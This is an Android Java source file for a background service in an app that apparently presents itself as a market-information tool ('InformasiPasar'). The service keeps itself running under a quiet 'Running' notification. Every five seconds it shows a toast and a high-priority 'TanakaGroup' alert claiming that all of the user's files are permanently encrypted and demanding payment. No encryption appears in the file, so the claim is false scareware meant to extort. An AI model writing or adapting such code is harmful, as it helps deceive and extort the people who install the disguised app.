package com.informasipasar.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

public class SpamService extends Service {

    private static final String CH = "spam_channel";
    private Handler handler;
    private Runnable toastRunnable;
    private Runnable notifRunnable;
    private int notifId = 1000;

    @Override
    public void onCreate() {
        super.onCreate();
        createChannel();
        startForeground(2, baseNotif());
        handler = new Handler(Looper.getMainLooper());
        startSpam();
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CH, "Spam", NotificationManager.IMPORTANCE_HIGH);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification baseNotif() {
        return new NotificationCompat.Builder(this, CH)
                .setContentTitle("InformasiPasar")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(true)
                .build();
    }

    private void startSpam() {
        // Toast tiap 5 detik
        toastRunnable = new Runnable() {
            @Override public void run() {
                Toast.makeText(getApplicationContext(),
                        "Your all files are permanently encrypted, pay if you want them back",
                        Toast.LENGTH_SHORT).show();
                handler.postDelayed(this, 5000);
            }
        };
        handler.post(toastRunnable);

        // Notifikasi tiap 5 detik
        notifRunnable = new Runnable() {
            @Override public void run() {
                NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
                Notification n = new NotificationCompat.Builder(SpamService.this, CH)
                        .setContentTitle("TanakaGroup")
                        .setContentText("Your all files are permanently encrypted, pay if you want them back")
                        .setSmallIcon(android.R.drawable.ic_dialog_alert)
                        .setPriority(NotificationCompat.PRIORITY_HIGH)
                        .setAutoCancel(true)
                        .build();
                if (nm != null) nm.notify(notifId++, n);
                handler.postDelayed(this, 5000);
            }
        };
        handler.post(notifRunnable);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
